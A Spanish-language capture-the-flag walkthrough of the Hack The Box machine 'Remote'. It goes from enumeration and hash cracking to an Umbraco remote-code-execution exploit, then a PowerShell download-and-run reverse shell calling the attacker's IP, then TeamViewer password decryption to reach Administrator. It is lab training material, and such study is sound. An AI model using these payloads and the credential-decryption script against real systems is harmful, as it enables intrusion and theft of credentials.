---
layout: post
title: HTB_Remote
date: 2023/07/10
slug: HTB_Remote
heroImage: /assets/machines.jpg
---

# Remote {-}

## Introduccion {-}

La maquina del dia se llama Remote.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/81Sfzyyi560/0.jpg)](https://www.youtube.com/watch?v=81Sfzyyi560)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.180
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.180
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.180 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,80,111,135,445,2049,49666 10.10.10.180 -oN targeted
```


| Puerto | Servicio | Que se nos occure?          | Que falta? |
| ------ | -------- | --------------------------- | ---------- |
| 21     | ftp      | anonymous                   |            |
| 80     | http     | Web Fuzzing                 |            |
| 111    | rpcbind  |                             |            |
| 135    | msrpc    |                             |            |
| 445    | smb      | Conneccion con null session |            |
| 2049   | mountd   | nfs, showmount              |            |
| 49666  | msrpc    | Puertos windows por defecto |            |


### Coneccion Anonoymous con ftp {-}

```bash
ftp 10.10.10.180

Name: anonymous
Password: 

User logged in.

dir

put allPorts
```

Nos podemos conectar pero no hay nada y no podemos subir nada.

### Listeo con showmount {-}

```bash
showmount -e 10.10.10.180
```

Aqui vemos un 
```bash
 /site_backups 
```
, lo montamos

```bash
mkdir /mnt/nfs
mount -t nfs 10.10.10.180:/site_backups /mnt/nfs
```

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.180
```

No vemos nada interesante aqui.

#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.180 
```
, El wappalizer no nos muestra nada.
Hay una serie de "posts" que habla de umbraco. Con google miramos lo que es umbraco y vemos que es un CMS.
Miramos si existe un exploit para umbraco.

```bash
searchsploit umbraco
```

Vemos que hay un exploit en python pero tenemos que estar loggeado.

Miramos por internet si hay un default path para el panel de administracion y vemos la routa 
```bash
 http://mysite/umbraco 
```
. Si vamos a este directorio
vemos el panel de autheticacion. Ahora tenemos que buscar el usuario y la contraseña.

## Vulnerability Assessment {-}

### Analyzando el mount {-}

```bash
cd /mnt/nfs
ls
cd App_Browsers
cd ..
cd App_Data
ls
```

Aqui vemos un fichero umbraco.config y un Umbraco.sdf. Miramos lo que contienen

```bash
cat umbraco.config
cat Umbraco.sdf
strings Umbraco.sdf | less -S
```

Aqui vemos usuarios con hashes.

### Crack hash con john {-}

Copiamos el hash en un fichero y lo crackeamos con john

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Ya tenemos una contraseña. Nos connectamos en el panel de authenticacion.

```bash
user: admin@htb.local 
pwd : baconandcheese
```

### Abusando de Umbraco {-}

Ahora que hemos ganado acceso al dashboard de Umbraco, tenemos que encontrar la via para ganar acceso al systema. Como ya hemos encontrado 
exploits en la **exploit-db**, vamos a utilizar una de ellas.

```bash
searchsploit umbraco
searchsploit -m 46153.py
mv 46153.py umbraco_exploit.py
vi umbraco_exploit.py
```

Aqui le ponemos los datos necessario

```python
login = "admin@htb.local"
password = "baconandcheese"
host = "http://10.10.10.180"

#en el payload
proc.StartInfo.FileName = "cmd.exe"
cmd = "/c ping 10.10.14.8"
```

Nos ponemos en escucha por trazas icmp

```bash
tcpdump -i tun0 icmp -n
```

y lanzamos el exploit con 
```bash
 python umbraco_exploit.py 
```
 y vemos que tenemos capacidad de ejecucion de comandos.


## Vuln exploit & Gaining Access {-}

### Umbraco {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Recuperamos conPtyShell

    ```bash
    git clone https://github.com/antonioCoco/ConPtyShell
    cd ConPtyShell
    cp invoke-ConPtyShell.ps1 ../conptyshell.ps1
    cd ..
    vi conptyshell.ps1
    ```

1. Añadimos al final del fichero el commando

    ```powershell
    Invoke-ConPtyShell -RemoteIp 10.10.14.8 -RemotePort 443 -Rows 52 -Cols 189
    ```

1. Creamos un servidor http con python

    ```bash
    python -m http.server 80
    ```

1. Modificamos el commando a lanzar en el umbraco_exploit.py

    ```python
    proc.StartInfo.FileName = "cmd.exe"
    cmd = "/c powershell IEX(New-Object Net.WebClient).downloadString(\'http://10.10.14.8/conptyshell.ps1\')"
    ```

1. Lanzamos el script

    ```bash
    python3 umbraco_exploit.py
    ```

Aqui vemos que hemos ganado acceso al systema como el usuario **defaultappool** con una shell totalmente interactiva.

### Tratamiento de la TTY {-}

```bash
^Z
stty raw -echo; fg
Enter
whoami
whoami
cd C:\
cd C:\
```

Aqui ya podemos ver la flag en el directorio Public.
## Privilege Escalation {-}

### Rootear la maquina {-}

```powershell
whoami
systeminfo
whoami /priv
```

Aqui vemos que tenemos privilegios SeImpersonatePrivilege. Podriamos tratar de utilizar el JuicyPotato pero en este caso vamos a hacerlo de otra forma.
Si hacemos 

```powershell
tasklist
```

Vemos que hay un **TeamViewer_Service.exe**. 

```bash
locate teamviewer | grep "metasploit"
cat /usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb
```

Como no vamos a utilizar metasploit nos creamos un script en python, pero primero miramos el script y recuperamos la version y la contraseña cifrada.

```powershell
cd C:\
cd PROGR~1
dir
cd PROGR~2
dir
cd TeamViewer
dir
#Output Version7

cd HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7
Get-itemproperty -Path .
(Get-itemproperty -Path .).SecurityPasswordAES
```

Aqui ya tenemos el cifrado de la contraseña. La copiamos y la modificamos para poder usarla desde el script de python

```bash
echo "255
155
28
115
214
107
206
49
172
65
62
174
19
27
78
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91" | xargs | sed 's/ /, /g' | tr -d '\n' | xclip -sel clip
```

y creamos nuestro script

```python
#!/usr/bin/python3
from Crypto.Cipher = AES

key = b'\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00'
IV = b'\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xf2\x5e\xa8\xd7\x04'

decipher = AES.new(key, AES.MODE_CBC, IV)
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 78, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

plaintext = decipher.decrypt(ciphertext).decode()
print(plaintext)
```

Lanzamos el script y tenemos la contraseña del teamviewer.

contraseña encontrada es contraseña que tenemos que verificar.

```bash
crackmapexec smb 10.10.10.180 -u 'Administrator' -p '!R3m0te!'
```

Nos da un **(Pwn3d!)**.

Nos connectamos con psexec

```bash
psexec.py WORKGROUP/Administrator@10.10.10.180 cmd.exe
password: !R3m0te!

whoami nt authority\system
```

Ya somos administrador y podemos ver la flag.
